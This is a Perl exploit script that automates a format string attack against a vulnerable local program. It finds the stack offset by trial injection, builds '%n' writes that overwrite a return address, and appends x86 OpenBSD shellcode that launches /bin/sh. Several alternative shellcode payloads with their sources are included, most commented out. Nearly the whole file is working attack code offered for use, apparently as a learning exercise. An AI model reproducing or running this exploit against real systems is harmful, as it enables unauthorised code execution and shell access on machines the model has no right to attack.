#!/usr/bin/perl

use warnings;
use strict;
use bytes;

use FileHandle;
use IPC::Open2;

my ($payload, $pop_s, $pop_b, $pop_p);

# openbsd shellcode thanks to marcetam admin@marcetam.net via
# http://www.linux-secure.com/endymion/shellcodes/
#
# Replace with shellcode for target platform
#$payload = ("\x99\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x54\x53\x53\x6a\x3b\x58\xcd\x80"); 

#$payload = "\x99"                        #/* cdq              */
#		  ."\x52"                        #/* push %edx        */
#		  ."\x68\x6e\x2f\x73\x68"        #/* push $0x68732f6e */
#		  ."\x68\x2f\x2f\x62\x69"        #/* push $0x69622f2f */
#		  ."\x89\xe3"                    #/* mov %esp,%ebx    */
#		  ."\x52"                        #/* push %edx        */
#		  ."\x54"                        #/* push %esp        */
#		  ."\x53"                        #/* push %ebx        */
#		  ."\x53"                        #/* push %ebx        */
#		  ."\x6a\x3b"                    #/* push $0x3b       */
#		  ."\x58"                        #/* pop %eax         */
#		  ."\xcd\x80";                   #/* int $0x80        */

#$payload = ("\xeb\x0e\x5e\x31\xc0\x88\x46\x07\x50\x50\x56\xb0\x3b\x50\xcd" .
#	"\x80\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23");

#$payload = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f" .
#	"\x62\x69\x6e\x89\xe3\x50\x53\x50\x54\x53" .
#	"\xb0\x3b\x50\xcd\x80");

# http://exp.syue.com/shellcode/1676
#$payload = ("\x31\xc0"                  #/* xor %eax,%eax */
#	."\x50"                      #/* push %eax */
#	."\x68\x2f\x2f\x73\x68"      #/* push $0x68732f2f (//sh) */
#	."\x68\x2f\x62\x69\x6e"      #/* push $0x6e69622f (/bin)*/
#	."\x89\xe3"                  #/* mov %esp,%ebx */
#	."\x50"                      #/* push %eax */
#	."\x54"                      #/* push %esp */
#	."\x53"                      #/* push %ebx */
#	."\x50"                      #/* push %eax */
#	."\xb0\x3b"                  #/* mov $0x3b,%al */
#	."\xcd\x80");                 #/* int $0x80 */

# http://exp.syue.com/shellcode/6275
#$payload = ("\x31\xd2".
#	"\xeb\x0e".
#	"\x31\xdb".
#	"\x5b".
#	"\xb1\x19".
#	"\x83\x2c\x1a\x01".
#	"\x42".
#	"\xe2\xf9".
#	"\xeb\x05".
#	"\xe8\xed\xff\xff\xff".
#	"\x32\xc1".
#	"\x51".
#	"\x69\x30\x30\x74\x69\x69".
#	"\x30\x63\x6a".
#	"\x6f".
#	"\x32\xdc".
#	"\x8a\xe4".
#	"\x51".
#	"\x55".
#	"\x54".
#	"\x51".
#	"\xb1\x3c".
#	"\xce".
#	"\x81");

# http://exp.syue.com/shellcode/8400
#$payload = "\x7f\x45\x4c\x46\x01\x01\x01\x09\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00\x74\x80\x04\x08\x34\x00\x00\x00\xa8\x00\x00\x00\x00\x00\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08\x8b\x00\x00\x00\x8b\x00\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00\x01\x00\x00\x00\x8c\x00\x00\x00\x8c\x90\x04\x08\x8c\x90\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x10\x00\x00\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b\xcd\x80\x44";

# http://exp.syue.com/shellcode/503
#$payload = "\xeb\x0d\x5f\x31\xc0\x50\x89\xe2\x52\x57\x54\xb0\x3b\xcd\x80\xe8\xee\xff\xff\xff/bin/sh";

# http://exp.syue.com/shellcode/518
$payload = "\xeb\x1b\x5e\x31\xc0\x6a\x1a\x6a\x17\x59\x49\x5b\x8a\x04\x0e\xf6\xd3\x30\xd8\x88\x04\x0e\x50\x85\xc9\x75\xef\xeb\x05\xe8\xe0\xff\xff\xff\x0e\x6f\xc7\xf9\xbe\xa3\xe4\xff\xb8\xff\xb2\xf4\x1f\x95\x4c\xfb\xf8\xfc\x1f\x74\x09\xb2\x65";

# http://exp.syue.com/shellcode/517
#$payload = "\xeb\x0e\x5e\x31\xc9\xb1\x1c\xfe\x04\x0e\xe2\xfb\xfe\x06\x56\xc3\xe8\xed\xff\xff\xff\xea\x0d\x5d\x30\xbf\x87\x45\x06\x4f\x53\x55\xaf\x3a\x4f\xcc\x7f\xe7\xec\xfe\xfe\xfe\x2e\x61\x68\x6d\x2e\x72\x67";

$pop_s = "%8x";  # what string to use for popping
$pop_b = 4;  # how many bytes this actually pops
$pop_p = 8;  # how many bytes this prints when executed

# Note to Rob:
#   If we used %llx, since we need to know how many characters we're printing,
#   we have to allow for 16 characters, which makes the format %16llx.
#
#   This is 6 bytes of format for 8 bytes of stack popping, which is the same
#   ratio we get with %8x, but it's less granular and harder to work with if
#   we have to pop an odd number of bytes.
#
#   I'm going to use %8x because the math works out, though there are more
#   efficient methods.

sub inject {
	my $out;

	my ($prog, $string) = @_;

	# This code must be modified to run $prog and inject $string, which is
	# dependent on $prog.
	
	#open2(*Read, *Write, "./$prog");
	#print Write $string;
	#close Write;
	#$out = <Read>;

	$out = `./$prog "$string"`;
	return $out;
}

sub stackpop {
	my ($prog, $correct_string, $lastout, $pfx, $sfx, $i);
	$prog = shift;
	$correct_string = "";
	$pfx = "AAAABBBB|"; $sfx = "|%08x|";
	$i = 0;

	while ($correct_string =~ /^$/) {
		my ($s, $out);
		$s = $pfx . $sfx;
		$out = inject($prog, $s);
		if ($out =~ /\|41414141\|/) {
			$correct_string = $s;
			$lastout = $out;
		} else {
			$pfx .= "%u";
			++$i;
		}
	}

	return $i;
}

sub extra_pops {
	# how many extra $pop_s do we append to get to the end of our string of
	# $pop_s's?
	# Yes, this is a race against oneself.

	my $npops = shift;

	# Comes from this:
	# ($npops + extra_pops) * len($pop_s) = $pop_b * extra_pops

	return ($npops * length($pop_s)) / ($pop_b - length($pop_s));
}

sub pop_string {
	my $npops = shift;

	return $pop_s x $npops;
}

sub attack_string {
	my ($already_written, $string, $payload_offset, $write_word);

	# Note: this is little-endian specific, just change it up if you're on a
	# big-endian machine

	my ($retloc, $bufloc, $npops) = @_;

	print STDERR "$retloc $bufloc $npops\n";

	$string = "";
	for (my $off=0; $off<4; ++$off) {
		$string .= chr(0x20) x 4;  # dummy integer to print

		for (my $i=0; $i<4; ++$i) {
			my $byte = (($retloc + $off) & (0xff << (8 * $i))) >> (8 * $i);
			$string .= chr($byte);
		}
	}

	$payload_offset = $npops * length($pop_s) + length($string);

	print STDERR "Payload starts at bufloc[$payload_offset].\n";

	$string .= $payload;

	$already_written = $npops * $pop_p + length($string);

	$write_word = $bufloc + $payload_offset;

	printf STDERR "Buffer address is  0x%08x\n", $bufloc;
	printf STDERR "Payload address is 0x%08x\n", $write_word;

	for (my $i=0; $i<4; ++$i) {
		my ($_write_byte, $_padding, $_already_written, $_fmts);

		$_write_byte = ($write_word & (0xff << (8 * $i))) >> (8 * $i);

		# A nice algorithm posed in scut's Exploiting Format String
		# Vulnerabilities

		$_write_byte += 0x100;
		$_already_written = $already_written % 0x100;
		$_padding = ($_write_byte - $_already_written) % 0x100;
		if ($_padding < 10) {
			$_padding += 0x100;
		}

		$_fmts = sprintf("%%%du%%n", $_padding);
		$string .= $_fmts;
		$already_written += $_padding;
	}

	return $string;
}

sub save_attack {
	my $tmpfile;

	my $attack = shift;

	$tmpfile = "tmp" . int(rand(256)) . ".in";
	open TMP, ">$tmpfile";
	print TMP $attack;
	close TMP;

	print STDERR "Saved attack string to $tmpfile.\n";
}

# main

my ($stackpops, $npops, $attack, $out);

if ($#ARGV != 2) {
	print STDERR "Usage: construct_string.pl <progname> <retloc> <bufloc>\n";
	exit 1;
}

my ($prog, $retloc, $bufloc) = @ARGV;

$stackpops = stackpop($prog);
$npops = $stackpops + extra_pops($stackpops);
$attack = pop_string($npops) . attack_string($retloc, $bufloc, $npops);

save_attack($attack);

print STDERR "Calculated attack.\nPipe it!\n";

#$out = inject($prog, $attack);

#print STDERR "\nGot output:\n\n$out\n";

print STDOUT $attack;

exit;
